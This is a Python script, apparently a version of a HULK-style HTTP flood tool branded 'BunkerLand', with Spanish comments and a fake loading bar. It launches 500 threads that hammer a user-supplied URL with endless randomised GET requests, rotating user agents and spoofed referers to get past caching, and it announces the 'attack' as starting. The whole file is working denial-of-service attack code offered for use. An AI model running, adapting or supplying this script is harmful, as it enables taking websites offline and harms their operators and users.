import time
from colorama import Fore, Style
import urllib.request
import sys
import threading
import random
import re
import useragents  # Asegúrate de que este módulo sea accesible.

# Inicialización global
request_counter = 0
flag = 0
safe = 0
url = ''
host = ''
headers_useragents = []
headers_referers = []

# Animación de carga
def loading_animation():
    stages = [
        "    [=                   ] 10%",
        "    [==                  ] 20%",
        "    [===                 ] 30%",
        "    [====                ] 40%",
        "    [=====               ] 50%",
        "    [======              ] 60%",
        "    [=======             ] 70%",
        "    [========            ] 80%",
        "    [===============     ] 85%",
        "    [====================] 100%"
    ]
    for stage in stages:
        print(Fore.BLUE + stage + Style.RESET_ALL)
        time.sleep(1)
    print("Cargando " + Fore.BLUE + "[BunkerLand]" + Style.RESET_ALL)
    time.sleep(2)

# Configuración del objetivo
def target_web():
    if len(sys.argv) < 2:
        return input("Ingresa Web Objetivo: ").strip()
    return sys.argv[1]

# Incrementar contador de solicitudes
def inc_counter():
    global request_counter
    request_counter += 1

# Establecer banderas
def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Generar lista de User-Agents
def useragent_list():
    global headers_useragents
    headers_useragents = useragents.user_agents_list
    print(Fore.YELLOW + "User-Agents cargados." + Style.RESET_ALL)

# Generar lista de referers
def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q='
    ]
    print(Fore.YELLOW + "Referers cargados." + Style.RESET_ALL)

# Construir parámetros aleatorios
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

# Uso del script
def usage():
    print(Fore.RED + 'USO: python bunker.py <url> [safe]' + Style.RESET_ALL)
    print('Añade "safe" para detener tras respuesta HTTP 500.')

# Realizar solicitud HTTP
def httpcall(target_url):
    useragent = random.choice(headers_useragents)
    referer = random.choice(headers_referers)
    params = f"{buildblock(5)}={buildblock(5)}"
    
    request = urllib.request.Request(
        target_url + ('&' if '?' in target_url else '?') + params,
        headers={
            'User-Agent': useragent,
            'Cache-Control': 'no-cache',
            'Referer': referer,
            'Connection': 'keep-alive',
            'Host': host
        }
    )

    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        if e.code == 500:
            set_flag(1)
            print(Fore.RED + "Respuesta 500 recibida." + Style.RESET_ALL)
        return e.code
    except urllib.error.URLError as e:
        print(Fore.RED + f"Error: {e.reason}" + Style.RESET_ALL)
        sys.exit()
    else:
        inc_counter()

# Hilos para ejecutar solicitudes
class HTTPThread(threading.Thread):
    def run(self):
        while flag < 2:
            httpcall(url)

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter:
                print(f"{request_counter} solicitudes enviadas.")
                previous = request_counter
        if flag == 2:
            print(Fore.GREEN + "\n-- Ataque finalizado --" + Style.RESET_ALL)

# Ejecución principal
if __name__ == "__main__":
    loading_animation()
    url = target_web()
    
    if url.count("/") == 2:
        url += "/"
    m = re.search(r'(https?://)?([^/]*)/?.*', url)
    host = m.group(2)

    print(Fore.BLUE + f"Objetivo establecido: {host}" + Style.RESET_ALL)

    useragent_list()
    referer_list()

    print(Fore.GREEN + "-- Ataque iniciado --" + Style.RESET_ALL)
    if len(sys.argv) == 3 and sys.argv[2] == "safe":
        set_safe()

    for _ in range(500):
        t = HTTPThread()
        t.start()

    monitor = MonitorThread()
    monitor.start()
